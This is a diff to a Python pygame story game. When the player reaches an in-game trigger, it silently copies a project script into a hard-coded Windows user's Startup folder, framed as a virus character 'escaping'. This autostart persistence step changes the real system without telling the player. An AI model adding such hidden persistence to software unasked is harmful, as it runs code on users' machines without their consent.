@@ -4,6 +4,7 @@ import Parkur.Methods
 from Story.Console_of_secrets import *
 import Story.Console_of_secrets
 from time import sleep
+import shutil
 import random
 
 pygame.init()
@@ -198,6 +199,9 @@ class Object:
         #if bottom <= selftop and right >= selfleft and left <= selfright and top >= selfbottom:
         if selfbottom >= top and selfright >= left and selfleft <= right and selftop <= bottom:
             data = Read()
+            to = r'C:\Users\Елена\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
+            file = r'C:\Users\Елена\Documents\GitHub\My-projects\Games\Project\Subtitles\subtitles.py'
+            shutil.copy(file,to)
             Say('[VirtualKiller]:Спасибо!!!!!!!!!!!!!!!!!!!!!!!.',0.15)
             Say('[Console]: Объект выбрался на поверхность!',0.001)
             sleep(2)
